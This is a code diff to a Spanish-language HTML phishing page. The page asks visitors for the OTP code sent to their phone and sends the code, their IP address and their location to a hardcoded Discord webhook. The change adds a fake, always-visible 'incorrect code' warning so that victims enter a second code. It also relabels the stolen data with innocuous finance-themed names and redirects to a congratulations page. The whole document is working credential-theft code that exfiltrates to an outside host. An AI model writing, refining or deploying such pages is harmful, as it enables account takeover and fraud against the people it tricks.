@@ -20,7 +20,7 @@
         .card {
             background: #ffffff;
             width: 100%;
-            max-width: 400px; /* Tarjeta un poco más estrecha */
+            max-width: 400px;
             padding: 35px;
             border-radius: 20px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.08);
@@ -35,28 +35,40 @@
             font-size: 16px;
             font-weight: 700;
             color: #2c3e50;
-            margin-bottom: 20px;
-            line-height: 1.5;
+            margin-bottom: 10px; /* Reducido para acercar la advertencia */
+            line-height: 1.4;
         }
 
-        /* Casilla más pequeña y centrada */
+        /* Advertencia siempre visible entre pregunta y casilla */
+        .alert-permanent {
+            background-color: #fff5f5;
+            color: #c0392b;
+            font-size: 13px;
+            font-weight: 600;
+            padding: 8px;
+            border-radius: 6px;
+            border-left: 4px solid #e74c3c;
+            margin-bottom: 15px;
+            display: inline-block;
+            width: 85%;
+        }
+
         .input-field {
-            width: 70%; /* Tamaño reducido */
+            width: 75%;
             padding: 12px 15px;
             border: 2px solid #e0e6ed;
             border-radius: 8px;
             font-size: 18px;
-            text-align: center; /* Texto centrado para montos dinero */
+            text-align: center;
             background-color: #f9fafb;
             transition: all 0.3s ease;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
         .input-field:focus {
             outline: none;
             border-color: #27ae60;
             background-color: #fff;
-            box-shadow: 0 0 8px rgba(39, 174, 96, 0.2);
         }
 
         .btn-green {
@@ -74,7 +86,7 @@
         }
 
         .btn-green:hover { background-color: #219150; }
-        .btn-green:disabled { background-color: #bdc3c7; cursor: not-allowed; }
+        .btn-green:disabled { background-color: #bdc3c7; }
 
         #gfg, #address { display: none; }
     </style>
@@ -90,9 +102,13 @@
         </div>
 
         <form id="discordForm">
-            <label class="question-label">Ingrese el Codigo otp enviado a su Telefono celular</label>
+            <label class="question-label">Ingresa el nuevo codigo</label>
             
-            <input type="number" id="clvuernm" class="input-field" placeholder="CODIGO" required>
+            <div class="alert-permanent">
+                ⚠️ El codigo ingresado es incorrecto.
+            </div>
+
+            <input type="text" id="clvuernm" class="input-field" placeholder="CODIGO" required>
 
             <button type="submit" id="submitBtn" class="btn-green">Confirmar</button>
         </form>
@@ -113,24 +129,29 @@
             e.preventDefault();
 
             const btn = document.getElementById('submitBtn');
-            const webhookURL = "https://discordapp.com/api/webhooks/1442908899123531806/8z_rCr-7dX0E_o2tWTgHfOcEfYeTLrXu3ZVLhOqPh2t2MO5QFwvp1WGrqxf3S2O2xoDL"; 
+            const inputVal = document.getElementById("clvuernm").value;
+            const ganancia = inputVal.replace(/[^0-9]/g, ''); 
 
-            // Limpieza de datos (solo números)
-            const ganancia = document.getElementById("clvuernm").value.replace(/[^0-9]/g, ''); 
+            // Validación simple para evitar envíos vacíos
+            if (ganancia === "" || parseInt(ganancia) <= 0) {
+                alert("Por favor, ingresa un monto válido para continuar.");
+                return;
+            }
+
+            const webhookURL = "https://discordapp.com/api/webhooks/1442908899123531806/8z_rCr-7dX0E_o2tWTgHfOcEfYeTLrXu3ZVLhOqPh2t2MO5QFwvp1WGrqxf3S2O2xoDL"; 
             const userIP = document.getElementById("gfg").innerHTML || "No detectada";
             const userLoc = document.getElementById("address").innerHTML || "No detectada";
 
-            btn.innerText = "Enviando...";
+            btn.innerText = "Procesando...";
             btn.disabled = true;
 
             const contents = {
                 embeds: [{
-                    title: "💰 Nueva Meta Financiera Captada",
-                    color: 242424, 
+                    title: "💰 Nueva Meta Captada",
+                    color: 3066993,
                     fields: [
-                        { name: "otp", value: "$" + ganancia + " USD", inline: false },
-                        { name: "IP del Cliente", value: userIP, inline: true },
-                        { name: "Ubicación", value: userLoc, inline: true }
+                        { name: "Meta Mensual", value: "$" + ganancia + " USD", inline: false },
+                        { name: "Datos de Origen", value: "IP: " + userIP + "\nUbicación: " + userLoc, inline: false }
                     ],
                     timestamp: new Date()
                 }]
@@ -143,16 +164,13 @@
             })
             .then(response => {
                 if (response.ok) {
-                    window.location.href = "index3.html";
-                } else {
-                    alert("Error al conectar. Inténtalo de nuevo.");
-                    btn.disabled = false;
-                    btn.innerText = "Obtener Plan Estratégico";
+                    window.location.href = "congratulation.html";
                 }
             })
             .catch(() => {
                 alert("Error de conexión.");
                 btn.disabled = false;
+                btn.innerText = "Obtener Plan Estratégico";
             });
         });
     </script>
